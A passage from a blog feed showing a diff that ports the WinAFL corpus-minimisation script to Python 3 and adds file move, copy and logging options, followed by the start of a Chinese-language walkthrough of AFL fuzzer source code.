class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- winafl-cmin.py2021-05-18 15:02:53.000000000 +0800</span></span><br><span class="line"><span class="comment">+++ my-cmin.py2021-05-20 11:54:55.000000000 +0800</span></span><br><span class="line"><span class="meta">@@ -286,6 +286,7 @@</span></span><br><span class="line">         &#x27;--skip-dry-run&#x27;, action = &#x27;store_true&#x27;, default = False,</span><br><span class="line">         help = &#x27;Skip the dry-run step even if it failed&#x27;</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     parser.add_argument(</span><br><span class="line">         &#x27;target_cmdline&#x27;, nargs = argparse.REMAINDER,</span><br><span class="line">         help = &#x27;target command line&#x27;</span><br><span class="line"><span class="meta">@@ -305,10 +306,46 @@</span></span><br><span class="line">     # Now we can copy the file to destination</span><br><span class="line">     shutil.copy(filepath, new_dest)</span><br><span class="line">     </span><br><span class="line"><span class="addition">+def MvArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Move setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-mv&#x27;, &#x27;--move&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Move files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def CpArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Copy setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-cp&#x27;, &#x27;--copy&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Copy files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def check_file(file):</span></span><br><span class="line"><span class="addition">+    if os.path.isfile(file):</span></span><br><span class="line"><span class="addition">+        print(&#x27;[+] %s has been deleted, new file will be generated.&#x27; %file)</span></span><br><span class="line"><span class="addition">+        command = &quot;del &quot;</span></span><br><span class="line"><span class="addition">+        command = command + file</span></span><br><span class="line"><span class="addition">+        os.system(command)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> def main(argc, argv):</span><br><span class="line"><span class="deletion">-    print &#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;</span></span><br><span class="line"><span class="addition">+    print(&#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Changed by 0xfocu5 &lt;o0xfocu5@gmail.com&gt;&#x27;)</span></span><br><span class="line"> </span><br><span class="line">     logging.basicConfig(</span><br><span class="line">         filename = &#x27;winafl-cmin.log&#x27;,</span><br><span class="line"><span class="meta">@@ -316,7 +353,48 @@</span></span><br><span class="line">         format = &#x27;%(asctime)s [%(levelname)-5.5s] [%(funcName)s] %(message)s&#x27;</span><br><span class="line">     )</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (argv[1] == &#x27;-mv&#x27; or argv[1] == &quot;-move&quot;):</span></span><br><span class="line"><span class="addition">+        args = MvArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.move)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            print(&quot;Move %s to %s&quot; %(line, path))</span></span><br><span class="line"><span class="addition">+            shutil.move(line, path)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    elif(argv[1] == &#x27;-cp&#x27; or argv[1] == &quot;-copy&quot;):</span></span><br><span class="line"><span class="addition">+        args = CpArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.copy)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+        output = []</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            output.append(line)</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for file_path in output:</span></span><br><span class="line"><span class="addition">+            print(&quot;Copy %s to %s&quot; %(file_path, path))</span></span><br><span class="line"><span class="addition">+            do_unique_copy(file_path, args.output)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     args = setup_argparse()</span><br><span class="line"><span class="addition">+    check_file(&quot;output.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;crash_files.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;hang_files.txt&quot;)</span></span><br><span class="line">     cli_handler = logging.StreamHandler(sys.stdout)</span><br><span class="line">     cli_handler.setLevel(args.verbose)</span><br><span class="line">     logging.getLogger().addHandler(cli_handler)</span><br><span class="line"><span class="meta">@@ -419,7 +497,7 @@</span></span><br><span class="line">     # Do a dry run with the first file in the set</span><br><span class="line">     logging.info(&#x27;[*] Testing the target binary...&#x27;)</span><br><span class="line">     f = AFLShowMapWorker(args)</span><br><span class="line"><span class="deletion">-    results = map(f, (inputs[0], inputs[0]))</span></span><br><span class="line"><span class="addition">+    results = list(map(f, (inputs[0], inputs[0])))</span></span><br><span class="line">     if results[0] != results[1]:</span><br><span class="line">         logging.error(&#x27;[!] Dry-run failed, 2 executions resulted differently:&#x27;)</span><br><span class="line">         logging.error(</span><br><span class="line"><span class="meta">@@ -435,7 +513,6 @@</span></span><br><span class="line">             return 1</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -497,12 +571,10 @@</span></span><br><span class="line"> </span><br><span class="line">     # Counter tracking how many files we have been through already.</span><br><span class="line">     i = 1</span><br><span class="line"><span class="deletion">-    for result in p.imap_unordered(</span></span><br><span class="line"><span class="deletion">-        AFLShowMapWorker(args),</span></span><br><span class="line"><span class="deletion">-        inputs</span></span><br><span class="line"><span class="deletion">-    ):</span></span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len),</span></span><br><span class="line"><span class="addition">+    for result in p.imap_unordered(AFLShowMapWorker(args), inputs):</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len)),</span></span><br><span class="line">         i += 1</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         # If the set of tuples is empty, something weird happened</span><br><span class="line">         if len(result.tuples) == 0:</span><br><span class="line">             logging.debug(</span><br><span class="line"><span class="meta">@@ -516,12 +588,15 @@</span></span><br><span class="line">         if result.returncode != wanted_returncode:</span><br><span class="line">             if result.returncode == 1:</span><br><span class="line">                 hang_files.append(result.path)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="addition">+                with open(&#x27;hang_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line">             # If the mode crash only is enabled, we track the non-crashing</span><br><span class="line">             # test cases in the same tuple.</span><br><span class="line">             if (result.returncode == 2 and args.crash_only is False) or \</span><br><span class="line">                (result.returncode == 0 and args.crash_only):</span><br><span class="line">                 crash_files.append(result.path)</span><br><span class="line"><span class="addition">+                with open(&#x27;crash_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line"> </span><br><span class="line">             if args.crash_only is False:</span><br><span class="line">                 logging.debug(</span><br><span class="line"><span class="meta">@@ -539,14 +614,13 @@</span></span><br><span class="line">             continue</span><br><span class="line"> </span><br><span class="line">         totalsize += result.filesize</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">         # Generate the list of unique tuples while processing the results,</span><br><span class="line">         # also keep track of their popularities.</span><br><span class="line">         uniq_tuples.update(result.tuples.keys())</span><br><span class="line"> </span><br><span class="line">         # Keep an updated dictionary mapping a tuple to the fittest file</span><br><span class="line">         # of all the paths.</span><br><span class="line"><span class="deletion">-        for tuple_id, tuple_hitcount in result.tuples.iteritems():</span></span><br><span class="line"><span class="addition">+        for tuple_id, tuple_hitcount in result.tuples.items():</span></span><br><span class="line">             fileinfo = &#123;</span><br><span class="line">                 &#x27;size&#x27; : result.filesize,</span><br><span class="line">                 &#x27;path&#x27; : result.path,</span><br><span class="line"><span class="meta">@@ -573,6 +647,10 @@</span></span><br><span class="line">             else:</span><br><span class="line">                 candidates[tuple_id] = fileinfo</span><br><span class="line"> </span><br><span class="line"><span class="addition">+        with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;) </span></span><br><span class="line"><span class="addition">+            </span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     len_crash_files, len_hang_files, len_empty_tuple_files = map(</span><br><span class="line">         len, (crash_files, hang_files, empty_tuple_files)</span><br><span class="line">     )</span><br><span class="line"><span class="meta">@@ -586,6 +664,7 @@</span></span><br><span class="line">         &#x27;[+] Found %d unique tuples across %d files&#x27;,</span><br><span class="line">         len_uniq_tuples, effective_len</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if len_hang_files &gt; 0:</span><br><span class="line">         logging.info(&#x27;  - %d files triggered a hang&#x27;, len_hang_files)</span><br><span class="line">         for hang_file in hang_files:</span><br><span class="line"><span class="meta">@@ -609,7 +688,6 @@</span></span><br><span class="line">             logging.debug(&#x27;    - %s generated an empty tuple&#x27;, empty_tuple_file)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[*] Finding best candidates for each tuple...&#x27;)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     # Using the same strategy than in afl-cmin, quoting lcamtuf:</span><br><span class="line">     # &#x27;&#x27;&#x27;</span><br><span class="line">     # The &quot;best&quot; part is understood simply as the smallest input that</span><br><span class="line"><span class="meta">@@ -631,7 +709,7 @@</span></span><br><span class="line"> </span><br><span class="line">         # Remove the other tuples also exercised by the candidate</span><br><span class="line">         # from the remaining_tuples list.</span><br><span class="line"><span class="deletion">-        for tuple_exercised in candidate[&#x27;tuples&#x27;].iterkeys():</span></span><br><span class="line"><span class="addition">+        for tuple_exercised in candidate[&#x27;tuples&#x27;].keys():</span></span><br><span class="line">             # Remove the tuples exercised if we have not</span><br><span class="line">             # removed them already from the</span><br><span class="line">             # remaining_tuples list.</span><br><span class="line"><span class="meta">@@ -640,15 +718,16 @@</span></span><br><span class="line"> </span><br><span class="line">         # Keep track of the final minset and its size.</span><br><span class="line">         minset.append(candidate[&#x27;path&#x27;])</span><br><span class="line"><span class="addition">+        </span></span><br><span class="line">         minsetsize += candidate[&#x27;size&#x27;]</span><br><span class="line"> </span><br><span class="line">         # We are now done with this tuple, we can get rid of it.</span><br><span class="line">         del candidates[tuple_]</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line">             len_uniq_tuples - len(remaining_tuples),</span><br><span class="line">             len_uniq_tuples</span><br><span class="line"><span class="deletion">-        ),</span></span><br><span class="line"><span class="addition">+        )),</span></span><br><span class="line"> </span><br><span class="line">         # If we don&#x27;t have any more tuples left, we are done.</span><br><span class="line">         if len(remaining_tuples) == 0:</span><br><span class="line"><span class="meta">@@ -670,10 +749,14 @@</span></span><br><span class="line">             &#x27;[*] Saving the minset in %s...&#x27;, os.path.abspath(args.output)</span><br><span class="line">         )</span><br><span class="line">         os.mkdir(args.output)</span><br><span class="line"><span class="addition">+        os.system(&quot;del output.txt&quot;)</span></span><br><span class="line">         for file_path in minset:</span><br><span class="line"><span class="addition">+            with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                f.write(file_path+&quot;\n&quot;)</span></span><br><span class="line">             do_unique_copy(file_path, args.output)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[+] Time elapsed: %d seconds&#x27;, time.time() - t0)</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     return 0</span><br><span class="line"> </span><br><span class="line"> if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 源码分析</title>
      <link href="posts/e04d4cd1/"/>
      <url>posts/e04d4cd1/</url>
      
        <content type="html"><![CDATA[<p>整体看的比较匆忙:(</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20201119171914.jpg" alt="15710161322527"></p><h1 id="Fuzz流程"><a href="#Fuzz流程" class="headerlink" title="Fuzz流程"></a>Fuzz流程</h1><ol><li><p>afl_fuzz的main函数会解析用户输入命令，检查环境变量的设置、输入输出路径、目标文件。程序定义了结构体<strong>queue_entry</strong>链表维护fuzz中使用的文件。</p></li><li><p>函数<strong>perform_dry_run()</strong> 会使用初始的测试用例进行测试，确保目标程序能够正常执行,生成初始化的queue和bitmap。</p></li><li><p>函数 <strong>cull_queue()</strong> 会对初始队列进行筛选（更新favored entry）。遍历top_rated[]中的queue，然后提取出发现新edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。</p></li><li><p>进入while(1)开始fuzz循环</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入循环后第一部还是 cull_queue() 对queue进行筛选</span><br><span class="line">判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</span><br><span class="line">fuzz_one() 函数会对queue_cur所对应文件进行fuzz，包括(跳过calibrate_case -修剪测试用例 -对用例评分 - 确定性变异或直接havoc&amp;ssplice)</span><br><span class="line">判断是否结束，更新queue_cur和current_entry</span><br><span class="line">当队列中的所有文件都经过变异测试了，则完成一次”cycle done”。整个队列又会从第一个文件开始，再次继续进行变异</span><br></pre></td></tr></table></figure></li></ol><p>其主要流程都写在<code>main</code>函数里面了，我们分析一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:t:T:dnCB:S:M:x:Q&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"> ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  setup_signal_handlers();</span><br><span class="line">  check_asan_opts();</span><br><span class="line">  ...</span><br><span class="line">  save_cmdline(argc, argv);</span><br><span class="line">  fix_up_banner(argv[optind]);</span><br><span class="line">  check_if_tty();</span><br><span class="line">  get_core_count();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  bind_to_free_cpu();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  check_crash_handling();</span><br><span class="line">  check_cpu_governor();</span><br><span class="line">  setup_post();</span><br><span class="line">    </span><br><span class="line">  setup_shm();</span><br><span class="line">    </span><br><span class="line">  init_count_class16();</span><br><span class="line">  setup_dirs_fds();</span><br><span class="line">  read_testcases();</span><br><span class="line">  load_auto();</span><br><span class="line">  pivot_inputs();</span><br><span class="line">  <span class="keyword">if</span> (extras_dir) load_extras(extras_dir);</span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) find_timeout();</span><br><span class="line">  detect_file_args(argv + optind + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (!out_file) setup_stdio_file();</span><br><span class="line">  check_binary(argv[optind]);</span><br><span class="line">  start_time = get_cur_time();</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line">  perform_dry_run(use_argv);</span><br><span class="line"></span><br><span class="line">  cull_queue();</span><br><span class="line"></span><br><span class="line">  show_init_stats();</span><br><span class="line"></span><br><span class="line">  seek_to = find_start_position();</span><br><span class="line"></span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    sleep(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    cull_queue();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      show_stats();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        ACTF(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = fuzz_one(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) show_stats();</span><br><span class="line"></span><br><span class="line">  write_bitmap();</span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  SAYF(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see 